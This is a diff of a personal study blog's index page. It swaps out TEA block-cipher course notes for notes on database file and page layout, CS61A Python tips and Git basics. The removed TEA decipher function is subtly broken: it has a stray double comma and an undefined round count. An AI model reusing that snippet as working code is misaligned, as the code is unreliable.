@@ -160,7 +160,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/03/24/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(7)/">
+    <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/07/15/cs186%E6%95%B0%E6%8D%AE%E5%BA%93/CS186_1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -174,7 +174,189 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2022/03/24/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(7)/" class="post-title-link" itemprop="url">信息安全概论（7）</a>
+            <a href="/2022/07/15/cs186%E6%95%B0%E6%8D%AE%E5%BA%93/CS186_1/" class="post-title-link" itemprop="url">数据库————磁盘和文件</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-07-15 10:27:27" itemprop="dateCreated datePublished" datetime="2022-07-15T10:27:27+08:00">2022-07-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-09-15 19:29:30" itemprop="dateModified" datetime="2022-09-15T19:29:30+08:00">2022-09-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" itemprop="url" rel="index"><span itemprop="name">数据库</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="磁盘和文件"><a href="#磁盘和文件" class="headerlink" title="磁盘和文件"></a>磁盘和文件</h1><h2 id="1-内存和硬盘"><a href="#1-内存和硬盘" class="headerlink" title="1 内存和硬盘"></a>1 内存和硬盘</h2><p>不论数据库什么时候使用数据，数据必须在内存中，访问这些数据相对较快，但是一旦数据量变得很大，将所有数据装进内存将变得不可能。磁盘配用来便宜的储存数据库的数据，但无论何时访问数据或写入新数据，它们都会产生巨大的成本。</p>
+<h2 id="2-文件、页面、记录"><a href="#2-文件、页面、记录" class="headerlink" title="2 文件、页面、记录"></a>2 文件、页面、记录</h2><p>关系型数据库最基本的单位是记录（行）。这些记录被组织成关系（表），他们可以被修改，删除或者在内存中创建。</p>
+<p>对磁盘来说基本的单位是页，是从磁盘到内存传输的最小单位，反之亦然。为了以与磁盘兼容的格式表示关系数据库，每个关系都存储在自己的文件中，其记录被组织到文件中的页面中。基于关系的模式和访问模式，数据库将确定：（1）使用的文件类型，（2）文件中页面的组织方式，（3）每个页面上记录的组织方式，以及（4）每个记录的格式。</p>
+<h2 id="3-选择文件类型"><a href="#3-选择文件类型" class="headerlink" title="3 选择文件类型"></a>3 选择文件类型</h2><p>文件有两种主要类型：堆文件和排序文件。对于每个关系，数据库根据关系访问模式的I/O成本选择要使用的文件类型。1个I/O相当于从磁盘读取1页或向磁盘写入1页，并且基于其访问模式中的插入、删除和扫描操作，为每种文件类型进行I/O计算。选择产生较少I/O成本的文件类型。</p>
+<h2 id="4-堆文件"><a href="#4-堆文件" class="headerlink" title="4 堆文件"></a>4 堆文件</h2><p>堆文件是一种文件类型，没有页面或页面上记录的特定顺序，它有两个主要实现：</p>
+<h3 id="4-1-链表实现"><a href="#4-1-链表实现" class="headerlink" title="4.1 链表实现"></a>4.1 链表实现</h3><p>在链表实现中，每一个数据页包含一个记录，一个自由空间追踪器和一个指针指向前一个界面或者后一个界面。有一个header pages被用作文件的开始，并且把界面分为满页和自由页。当空间被需要的时候，空页被分配并加到自由页的部分。当自由页的数据满了就把自由页加到满页部分的前头。因为我们加在前面，所以不需要穿过整个满页去添加它。另一种方法是在标题页中保持指向该列表末尾的指针。我们使用的实现的细节对于本课程并不重要。</p>
+<p><img src="/2022/07/15/cs186%E6%95%B0%E6%8D%AE%E5%BA%93/CS186_1/image-20220907172924957.png" alt="image-20220907172924957"></p>
+<h3 id="4-2-页面文件实现"><a href="#4-2-页面文件实现" class="headerlink" title="4.2 页面文件实现"></a>4.2 页面文件实现</h3><p>页面文件实现和链表的实现不同之处在于使用了header pages的链表。每个header pages包含一个指针指向下一个header pages。每个header pages包含一个指针（字节偏移）到下一个header pages，它全部包含了一个指向数据页的指着和一堆指向空闲数据页的指针。因为我们的头页面储存了全部的数据页面，数据页面不用在储存相邻的页面。</p>
+<p><img src="/2022/07/15/cs186%E6%95%B0%E6%8D%AE%E5%BA%93/CS186_1/image-20220907173933155.png" alt="image-20220907173933155"></p>
+<p>与链表相比，页面目录的主要优点是插入记录通常更快。要在链表实现中找到具有足够空间的页面，可能需要读取标题页面和空闲部分中的每个页面。相反，页面目录实现最多只需要读取所有标题页，因为它们包含关于文件中每个数据页上剩余空间的信息。</p>
+<p>为了强调这一点，请考虑以下示例，其中堆文件被实现为链接列表和页面目录。每个页面为30字节，一个20字节的记录被插入到文件中：</p>
+<p>链表</p>
+<p><img src="/2022/07/15/cs186%E6%95%B0%E6%8D%AE%E5%BA%93/CS186_1/image-20220907174330877.png" alt="image-20220907174330877"></p>
+<p>页面目录</p>
+<p><img src="/2022/07/15/cs186%E6%95%B0%E6%8D%AE%E5%BA%93/CS186_1/image-20220907174402220.png" alt="image-20220907174402220"></p>
+<p>这只是一个很小的例子，随着页面数量的增加，这种情况会导致在链接列表中插入比在页面目录中插入要昂贵得多。</p>
+<p>无论使用何种实现，堆文件都比排序文件（如下所述）提供更快的插入，因为记录可以添加到具有空闲空间的任何页面，而找到具有足够空闲空间的页面通常非常便宜。但是，在堆文件中搜索记录每次都需要完全扫描。必须查看每个页面上的每个记录，因为记录是无序的，导致每次搜索操作的线性成本为N个I/O。我们将看到，排序后的文件在搜索记录时会更好。</p>
+<h2 id="排序的文件"><a href="#排序的文件" class="headerlink" title="排序的文件"></a>排序的文件</h2><p>排序文件是一种文件类型，其中页面排序，每个页面中的记录按键排序。</p>
+<p>这些文件使用页面目录实现，并根据记录的排序方式对数据页面进行排序。查找排序的文件需要logn的IO。其中N为界面的数量，因为二分搜索可以用来查找包含记录的界面。同时，在平均情况下，插入需要logN+N个I/O，因为需要二分搜索才能找到要写入的页面，并且插入的记录可能会导致所有后续记录被推回一个。平均而言，N/2页将需要被推回，并且这涉及对这些页中的每一页的读和写IO，这导致N个I/O项。</p>
+<p>下面的例子说明了最坏的情况。每个数据页最多可存储2条记录，因此在数据页1中插入一条记录需要对随后的所有页进行读写，因为其余记录需要被推回。</p>
+<p><img src="/2022/07/15/cs186%E6%95%B0%E6%8D%AE%E5%BA%93/CS186_1/image-20220907175728561.png" alt="image-20220907175728561"></p>
+<h2 id="6-Header-Pages-计数的注意事项"><a href="#6-Header-Pages-计数的注意事项" class="headerlink" title="6 Header Pages 计数的注意事项"></a>6 Header Pages 计数的注意事项</h2><p>在计算操作成本I/O时，一个常见的混淆区域是是否将访问文件头页的成本包括在内。对于本课程中的所有问题，当问题中没有提供底层文件实现时，您应该忽略与读/写文件头页相关的I/O成本。另一方面，当问题中提供了特定的文件实现（即，使用链接列表或页面目录实现的堆文件）时，您必须包括与读取/写入文件头页相关的I/O成本。</p>
+<h2 id="7-记录类型"><a href="#7-记录类型" class="headerlink" title="7 记录类型"></a>7 记录类型</h2><p>记录类型完全由关系的模式决定，有两种类型：固定长度记录（FLR）和可变长度记录（VLR）。FLR仅包含固定长度字段（整数、布尔值、日期等），具有相同模式的FLR由相同数量的字节组成。同时，VLR包含固定长度和可变长度字段（如varchar），导致相同模式的每个VLR具有潜在不同的字节数。VLR在可变长度字段之前存储所有固定长度字段，并使用包含指向可变长度字段结尾的指针的记录头。</p>
+<p><img src="/2022/07/15/cs186%E6%95%B0%E6%8D%AE%E5%BA%93/CS186_1/image-20220907180701912.png" alt="image-20220907180701912"></p>
+<p>无论格式如何，每个记录都可以通过其记录id唯一标识-[第#页，第#个记录在这一页]。</p>
+<h2 id="8-页面类型"><a href="#8-页面类型" class="headerlink" title="8 页面类型"></a>8 页面类型</h2><h3 id="8-1固定长度记录的页面"><a href="#8-1固定长度记录的页面" class="headerlink" title="8.1固定长度记录的页面"></a>8.1固定长度记录的页面</h3><p>包含FLR的页面始终使用Header Page来存储当前页面上的记录数。如果页面已打包，则记录之间没有间隙。这使得插入变得容易，因为我们可以使用现有记录的数量和每条记录的长度来计算页面中的下一个可用位置。计算此值后，我们将在计算的偏移量处插入记录。删除稍微复杂一些，因为它需要将删除记录之后的所有记录移到页面顶部一个位置，以保持页面压缩。如果页面被解包，页面标题通常会存储一个额外的位图，该位图将页面分成多个插槽，并跟踪打开或占用的插槽。</p>
+<p><img src="/2022/07/15/cs186%E6%95%B0%E6%8D%AE%E5%BA%93/CS186_1/image-20220907181225957.png" alt="image-20220907181225957"></p>
+<p>使用位图，插入包括找到第一个打开位，在相应的槽中设置新记录，然后为该槽设置位。删除时，我们清除已删除记录的相应位，以便将来的插入可以覆盖该插槽。</p>
+<p><strong>8.2都是机翻的，有空再看看</strong></p>
+<h3 id="8-2具有可变长度记录的页面"><a href="#8-2具有可变长度记录的页面" class="headerlink" title="8.2具有可变长度记录的页面"></a>8.2具有可变长度记录的页面</h3><p>可变长度记录和固定长度记录之间的主要区别在于，我们不再保证每个记录的大小。为了解决这个问题，每个页面都使用一个页面页脚来维护插槽目录跟踪插槽计数、空闲空间指针和条目。页脚从页面底部而不是顶部开始，这样插入记录时插槽目录就有增长空间。</p>
+<p>插槽计数跟踪插槽总数。这包括填充和空插槽。空闲空间指针指向页面内的下一个空闲位置。插槽目录中的每个条目由一个[记录指针，记录长度]对组成。</p>
+<p>如果页面被解包，删除涉及在槽目录中查找记录的条目，并将记录指针和记录长度设置为空。</p>
+<p><img src="/2022/07/15/cs186%E6%95%B0%E6%8D%AE%E5%BA%93/CS186_1/image-20220907182028599.png" alt="image-20220907182028599"></p>
+<p>对于将来的插入，记录将在空闲空间指针处插入页面，并在任何可用的空条目中设置新的[pointer，length]对。在没有空条目的情况下，将向该记录的槽目录添加新条目。时隙计数用于确定新时隙条目应添加到哪个偏移，然后时隙计数递增。定期将记录重新组织为压缩状态，删除已删除的记录，以便为将来的插入腾出空间。</p>
+<p>如果页面已打包，则删除涉及将插槽目录中的记录条目设置为空。此外，删除记录后的记录必须向页面顶部移动一个位置，相应的槽目录条目必须向页面底部移动一个。请注意，我们只是在删除记录的页面内移动记录。我们不会为文件跨页面重新打包记录。对于插入，记录在空闲空间指针处插入，如果所有插槽都已满，则每次都会添加一个新条目。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/05/30/Linear%20Algebra/S1.2SOL/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wys的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/30/Linear%20Algebra/S1.2SOL/" class="post-title-link" itemprop="url">S1.2SOL</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-05-30 13:28:27" itemprop="dateCreated datePublished" datetime="2022-05-30T13:28:27+08:00">2022-05-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-06-06 20:05:07" itemprop="dateModified" datetime="2022-06-06T20:05:07+08:00">2022-06-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/MIT18-06/" itemprop="url" rel="index"><span itemprop="name">MIT18.06</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <div class="pdfobject-container" data-target="pdf/S1.2SOL.pdf" data-height="500px"></div>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/05/30/Linear%20Algebra/UNIT1_1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wys的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/30/Linear%20Algebra/UNIT1_1/" class="post-title-link" itemprop="url">U1_1 THE GEOMETRY OF LINEAR EQUATIONS</a>
         </h2>
 
         <div class="post-meta">
@@ -185,7 +367,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2022-03-24 20:14:27 / Modified: 22:19:11" itemprop="dateCreated datePublished" datetime="2022-03-24T20:14:27+08:00">2022-03-24</time>
+              <time title="Created: 2022-05-30 13:28:27 / Modified: 13:37:41" itemprop="dateCreated datePublished" datetime="2022-05-30T13:28:27+08:00">2022-05-30</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -193,7 +375,7 @@
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
+                  <a href="/categories/MIT18-06/" itemprop="url" rel="index"><span itemprop="name">MIT18.06</span></a>
                 </span>
             </span>
 
@@ -208,24 +390,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="tea基本介绍">7.1.2 tea基本介绍</h2>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> v[<span class="number">2</span>], <span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>],i,sum = <span class="number">0</span>,delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i &lt; <span class="number">32</span>;i++)&#123;</span><br><span class="line">		v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">		sum += delta;</span><br><span class="line">		v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	v[<span class="number">0</span>] = v0;v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><strong>TEA的特点</strong></p>
-<ul>
-<li>简单、代码短、无密钥扩展、安全。</li>
-<li>理念：轮多转，可以让简单变安全。</li>
-<li>实现：CPU基本指令（移位、异或、位与、模加、模减）、占用内存也很小</li>
-</ul>
-<h2 id="tea算法设计">7.2.1 tea算法设计</h2>
-<p>TEA的设计：</p>
-<ol type="1">
-<li><p><span class="math inline">\(feistel\)</span>结构，用+-代替⊕（XOR）</p></li>
-<li><p>轮函数F比较简单</p></li>
-<li><p>轮多：32个循环，64轮。</p>
-<p>其中<span class="math inline">\(\delta = \lfloor(\sqrt{5}-1)2^{31} \rfloor\)</span>,只要不为0就行。</p>
-<p><strong>TEA的解密函数</strong></p></li>
-</ol>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> v[<span class="number">2</span>], <span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>],,delta = <span class="number">0x9E3779B9</span>,sum = delta*num_rounds;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i &lt; num_rounds;i++)&#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">		sum -= delta;</span><br><span class="line">		v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	v[<span class="number">0</span>] = v0;v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+          <div class="pdfobject-container" data-target="pdf/test.pdf" data-height="500px"></div>
 
       
     </div>
@@ -245,7 +410,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/03/24/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(6)/">
+    <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/04/06/cs61a/cs61a%E9%9A%BE%E9%A2%98%E6%91%98%E5%BD%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -259,7 +424,450 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2022/03/24/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(6)/" class="post-title-link" itemprop="url">信息安全概论（6）</a>
+            <a href="/2022/04/06/cs61a/cs61a%E9%9A%BE%E9%A2%98%E6%91%98%E5%BD%95/" class="post-title-link" itemprop="url">cs61a难题摘录</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-04-06 09:40:27" itemprop="dateCreated datePublished" datetime="2022-04-06T09:40:27+08:00">2022-04-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-04-12 20:24:01" itemprop="dateModified" datetime="2022-04-12T20:24:01+08:00">2022-04-12</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/cs61a/" itemprop="url" rel="index"><span itemprop="name">cs61a</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="cs61a难题摘录">CS61A难题摘录</h1>
+<h2 id="hw02">HW02</h2>
+<p><strong>problem</strong></p>
+<p>The logician Alonzo Church invented a system of representing non-negative integers entirely using functions. The purpose was to show that functions are sufficient to describe all of number theory: if we have functions, we do not need to assume that numbers exist, but instead we can invent them.</p>
+<p>Your goal in this problem is to rediscover this representation known as <em>Church numerals</em>. Here are the definitions of <code>zero</code>, as well as a function that returns one more than its argument:</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/04/06/cs61a/cs61a%E9%9A%BE%E9%A2%98%E6%91%98%E5%BD%95/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/04/01/cs61a/cs61a/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wys的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/04/01/cs61a/cs61a/" class="post-title-link" itemprop="url">cs61a</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-04-01 22:21:27" itemprop="dateCreated datePublished" datetime="2022-04-01T22:21:27+08:00">2022-04-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-04-11 21:41:31" itemprop="dateModified" datetime="2022-04-11T21:41:31+08:00">2022-04-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/cs61a/" itemprop="url" rel="index"><span itemprop="name">cs61a</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="cs61a-2020summer">CS61A (2020summer)</h1>
+<p><code>from operator import truediv,floordiv</code></p>
+<p><code>truediv</code> == /</p>
+<p><code>floordiv</code> == //</p>
+<p>可以编写文档进行测试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;Our first Python source file&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">from operator import floordiv,mod</span><br><span class="line"></span><br><span class="line">def divide_exact(n,d):</span><br><span class="line">    &quot;&quot;&quot;Return the quotient and remainder of dividing N by D.</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; q, r = divide_exact(2013,10)</span><br><span class="line">    &gt;&gt;&gt; q</span><br><span class="line">    201</span><br><span class="line">    &gt;&gt;&gt; r</span><br><span class="line">    3</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    return floordiv(n, d),mod(n, d)</span><br></pre></td></tr></table></figure>
+<p>执行方法：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m doctest file.py</span><br></pre></td></tr></table></figure>
+<p>假值有 <code>False</code>， <code>0</code>，<code>‘’</code>，<code>None</code></p>
+<p>Functions have as their parent the frame in which they were defined.</p>
+<p><code>tuple</code> 可以作为字典的 <code>key</code></p>
+<p><code>list</code> 不能作为字典的<code>key</code></p>
+<p>可变的默认参数是危险的</p>
+<p>示例如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">s = []</span>):</span></span><br><span class="line"><span class="meta">... </span>    s.append(<span class="number">5</span>)</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> <span class="built_in">len</span>(s)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f()</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f()</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f()</span><br><span class="line"><span class="number">3</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
+<p>迭代器的<code>for</code> 语句只能迭代一次。</p>
+<p>迭代器可以迭代字典的<code>key</code>、<code>value</code>、<code>item</code> ，当字典的结构发生变化时，迭代器失效。</p>
+<p><strong>Built-in Functions for Iteration</strong></p>
+<p><img src="/2022/04/01/cs61a/cs61a/image-20220411213249514.png"></p>
+<p>返回 <code>yield</code> 语句的是 <code>generator</code> ，一个 <code>generator</code> 可以返回多个 <code>yield</code> 语句。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/03/30/missing-semester/Version%20Control%20(Git)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wys的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/30/missing-semester/Version%20Control%20(Git)/" class="post-title-link" itemprop="url">Version Control (Git)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-03-30 14:31:27" itemprop="dateCreated datePublished" datetime="2022-03-30T14:31:27+08:00">2022-03-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-09-07 11:26:21" itemprop="dateModified" datetime="2022-09-07T11:26:21+08:00">2022-09-07</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Missing-Semester/" itemprop="url" rel="index"><span itemprop="name">Missing-Semester</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Version-Control-Git"><a href="#Version-Control-Git" class="headerlink" title="Version Control (Git)"></a>Version Control (Git)</h1><p><code>git init</code>创建仓库 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line">Initialized empty Git repository <span class="keyword">in</span> /home/rust/missing/playgroud/demo/.git/</span><br></pre></td></tr></table></figure>
+
+<p><code>git help</code> 查看帮助，后面要加上参数，比如说<code>git init</code></p>
